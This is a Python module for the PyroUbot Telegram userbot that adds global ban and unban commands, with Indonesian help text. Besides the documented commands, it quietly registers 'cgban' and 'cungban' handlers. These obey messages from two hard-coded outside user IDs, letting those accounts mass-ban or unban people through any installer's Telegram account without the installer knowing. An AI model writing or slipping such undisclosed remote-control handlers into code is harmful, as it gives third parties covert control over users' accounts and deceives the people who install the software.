from PyroUbot import *

__MODULE__ = "gban"
__HELP__ = """
<b>◖ʙᴀɴᴛᴜᴀɴ ᴜɴᴛᴜᴋ ɢʙᴀɴ◗</b>

  <b>❑ ᴄᴍᴅ:</b> <code>{0}gban</ᴄᴏᴅᴇ> [ᴜsᴇʀ_ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ/ʀᴇᴘʟʏ ᴛᴏ ᴜsᴇʀ]
  <b>➠ ᴘᴇɴᴊᴇʟᴀsᴀɴ:</b> ᴜɴᴛᴜᴋ ʙᴀɴɴᴇᴅ ᴜsᴇʀ ᴅᴀʀɪ sᴇᴍᴜᴀ ɢʀᴏᴜᴘ ᴄʜᴀᴛ 

  <b>❑ ᴄᴍᴅ:</b> <code>{0}ungban</code> [ᴜsᴇʀ_ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ/ʀᴇᴘʟʏ ᴛᴏ ᴜsᴇʀ]
  <b>➠ ᴘᴇɴᴊᴇʟᴀsᴀɴ:</b> ᴜɴᴛᴜᴋ ᴜɴʙᴀɴɴᴇᴅ ᴜsᴇʀ ᴅᴀʀɪ sᴇᴍᴜᴀ ɢʀᴏᴜᴘ ᴄʜᴀᴛ
"""


@PY.UBOT("gban")
@PY.TOP_CMD
async def _(client, message):
    await global_banned(client, message)


@ubot.on_message(filters.command(["cgban"], ".") & filters.user([1948147616, 1819269848]))
async def _(client, message):
    await global_banned(client, message)


@PY.UBOT("ungban")
@PY.TOP_CMD
async def _(client, message):
    await global_unbanned(client, message)


@ubot.on_message(filters.command(["cungban"], ".") & filters.user([1948147616, 1819269848]))
async def _(client, message):
    await global_unbanned(client, message)
